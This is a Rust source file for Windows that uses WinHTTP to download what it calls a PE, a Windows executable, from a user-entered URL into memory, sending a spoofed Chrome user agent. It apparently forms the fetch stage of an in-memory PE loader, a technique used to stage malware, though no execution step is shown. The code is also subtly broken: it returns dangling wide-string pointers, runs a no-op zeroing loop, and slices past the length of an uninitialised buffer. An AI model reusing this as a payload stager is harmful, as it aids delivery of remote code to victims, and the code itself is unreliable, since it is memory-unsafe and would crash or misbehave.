use url::Url;
use std::io::Write;
use std::ffi::OsStr;
use core::ffi::c_void;
use windows::core::{PCWSTR, PWSTR};
use crate::error::AppError;
use std::convert::TryFrom;
use std::io::{Error, ErrorKind};
use  std::os::windows::ffi::OsStrExt;
use windows::Win32::Networking::WinHttp::*;
use windows::Win32::Foundation::{GetLastError, BOOL};

// &str->PCWSTR
fn __str_to_pcwstr(stackstr: &str)->PCWSTR{
    let mut __wide_arr: Vec<u16> = OsStr::new(stackstr).encode_wide().collect();
    __wide_arr.push(0);
    
    return PCWSTR(__wide_arr.as_ptr() as *const u16);
}

// u32->usize
fn __u32_to_usize(val: u32)->usize {
    // Allocate space for the buffer
    let u_val: usize = match usize::try_from(val){
        Ok(_res) => _res,
        Err(_) => val as usize,
    };
    u_val
}

// close handle
fn __close_handle(handle: *mut c_void, handle_name: &str) {
    let result: bool;
    unsafe {
        result = WinHttpCloseHandle(handle).as_bool();
    }
    
    if !result {
        println!("[!] Failed to close handle to {}()", handle_name);
    }
}


// Get URL as user input
pub fn fetch_url() -> Result<String, std::io::Error> {
    let mut url_str: String = String::new();
    print!("[>] Enter URL('quit' to exit): ");

    // Flush stdout
    match std::io::stdout().flush() {
        Ok(v) => v,
        Err(_e) => {
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput,"[-] Failed to flush STDOUT!"));
        },
    };

    // Take input from command line
    match std::io::stdin().read_line(&mut url_str){
        Ok(v) => v,
        Err(_e) => {
            return Err(Error::new(ErrorKind::InvalidInput,"[-] Failed to readline!"));
        }, 
    };   

    // Return URL string
    Ok(url_str.clone())
}


// Fetch PE
pub fn fetch_pe(url: Url)->Result<Vec<u8>, AppError> {
    // Buffer to be returned
    let mut pe_buf: Vec<u8>  = Vec::new();

    // URL Schema
    let scheme: &str = url.scheme().trim();
    let path: &str = url.path().trim(); 

    // User Agent String
    let user_agent: PCWSTR = __str_to_pcwstr("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36");

    // Handles 
    let hsession: *mut c_void;
    let hconnect: *mut c_void;
    let hrequest: *mut c_void;
    let mut hresult: BOOL;

    // Proxy Options for WinHttpOpen
    let _proxy_option = PCWSTR::null();
    let _proxy_bypass = PCWSTR::null();

    // HTTP options for WinHttpOpenConnect
    let __http_version = PCWSTR::null();
    let __http_referring_doc = PCWSTR::null();
    let mut __http_default_access_type: PWSTR =  PWSTR::null();

    // Fetch Servername from URL
    let servername: PCWSTR = match url.host_str() {
        Some(_sn) => {
            println!("[i] Server: {}", _sn);
            __str_to_pcwstr(_sn)
        },
        None => {
            return Err(AppError { description: "Failed to determine Servername".to_string() });
        }
    };
    
    // Fetch Port number from URL
    let port: u32 = match url.port_or_known_default() {
        Some(_p) => {
            println!("[i] Port: {}",_p);
            _p.into()
        },
        None => {
            return Err(AppError { description: "Failed to determine Port Number".to_string() });
        }
    };

    // Secure connection option
    let secure_flag: WINHTTP_OPEN_REQUEST_FLAGS;

    // Check for HTTP/HTTPS streams
    if scheme.ne("http") && scheme.ne("https") {
        return Err(AppError {description: "Invalid Schema".to_string()});
    }

    // Initialize WinHTTP functions
    unsafe {
        hsession = WinHttpOpen (
            user_agent,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            _proxy_option,
            _proxy_bypass,
            0u32);
        }

    // Check for valid pointer
    if hsession.is_null() {
        let mut _err_msg: String = String::new();
        unsafe {
            _err_msg = format!("WinHttpOpen() failed with Error code: {:#x}", GetLastError().to_hresult().0);
        }
        return Err(AppError { description: _err_msg });
    }

    // Specify the initial target server of a HTTP request
    unsafe {
        hconnect = WinHttpConnect(
            hsession,
            servername,
            INTERNET_PORT(port),
            0u32,
        );
    }

    if hconnect.is_null() {
        let mut _err_msg: String = String::new();
        unsafe {
            _err_msg = format!("WinHttpConnect() failed with Error code: {}", GetLastError().0);
        }
        return Err(AppError { description: _err_msg });
    }

    // Set security flags according to protocol
    if scheme == "https" {
        println!("[i] Using Secure HTTPS");
        secure_flag = WINHTTP_FLAG_SECURE;
    }
    else {
        println!("[i] Using Insecure HTTP");
        secure_flag = WINHTTP_OPEN_REQUEST_FLAGS(0u32);
    }

    // Make request to Endpoint/Path
    unsafe {
        hrequest = WinHttpOpenRequest(
            hconnect,
            __str_to_pcwstr("GET"),
            __str_to_pcwstr(path),
            __http_version,
            __http_referring_doc,
            &mut __http_default_access_type,
            secure_flag
        );
    }

    if hrequest.is_null(){
        let mut _err_msg: String = String::new();
        unsafe {
            _err_msg = format!("WinHttpOpenRequest() failed with Error code: {}", GetLastError().0);
        }
        return Err(AppError { description: _err_msg });
    }

    // Send Request
    unsafe{
        hresult = WinHttpSendRequest(
            hrequest,
            None,
            None,
            0u32,
            0u32,
            0 as usize
        );
    }
    
    if !hresult.as_bool() {
        let mut _err_msg: String = String::new();
        unsafe {
            _err_msg = format!("WinHttpSendRequest() failed with Error code: {}", GetLastError().0);
        }
        return Err(AppError { description: _err_msg });
    }

    // Check Response
    unsafe {
        hresult = WinHttpReceiveResponse(hrequest, std::ptr::null_mut() as *mut c_void);
    }

    if !hresult.as_bool() {
        let mut _err_msg: String = String::new();
        unsafe {
            _err_msg = format!("WinHttpReceiveResponse() failed with Error code: {}", GetLastError().0);
        }
        return Err(AppError { description: _err_msg });
    }

    // Read data as it comes
    loop {
        let mut __size:u32 = 0;
        let mut __bytes_read:u32 = 0;
        let __has_data: bool;

        // Check if there is more incoming data
        unsafe{
            __has_data =  WinHttpQueryDataAvailable(hrequest, &mut __size ).as_bool();
        }

        if !__has_data{
            unsafe {
                eprintln!("WinHttpReceiveResponse() failed with Error code: {}", GetLastError().0);
            }
        }

        // Allocate space for the buffer
        let __usize: usize = __u32_to_usize(__size);
        let mut out_buf: Vec<u8> = Vec::new();
        match out_buf.try_reserve(__usize){
            Ok(_) => {
                println!("[i] Receiving Chunk Size: {}", __usize);
            },
            Err(_e) => {
                let mut _err_msg: String = format!("[!] Out Of Memory");
                __size = 0;
            }
        }
        let mut out_buf: Vec<u8> = Vec::with_capacity(__usize+1);
        
        // Zero out the memoery
        for i in out_buf.iter_mut()  {
            *i = 0u8;
        }

        // Read data into buffer
        let __res_read_data: bool;
        unsafe {
            __res_read_data = WinHttpReadData(hrequest,
                out_buf.as_mut_ptr().cast::<c_void>(),
                __size, &mut __bytes_read).as_bool();
        }

        if !__res_read_data {
            unsafe {
                eprintln!("WinHttpReadData() failed with Error code: {}", GetLastError().0);
            }
        }
        
        let _uread: usize = __u32_to_usize(__bytes_read);       
        
        pe_buf.extend_from_slice(&out_buf[0.._uread]);
        println!("This works");

        if __size <= 0 {
            break;
        }
    } 

    if pe_buf.is_empty(){
        __close_handle(hrequest, "WinHttpOpenRequest");
        __close_handle(hconnect, "WinHttpConnect");
        __close_handle(hsession, "WinHttpOpen");
        return Err(AppError { description: String::from("Failed to Read Data into PE Buffer") });
    }

    // Close Open Handles
    println!("[i] Closing Handles");
    __close_handle(hrequest, "WinHttpOpenRequest");
    __close_handle(hconnect, "WinHttpConnect");
    __close_handle(hsession, "WinHttpOpen");

    Ok(pe_buf.clone())
}
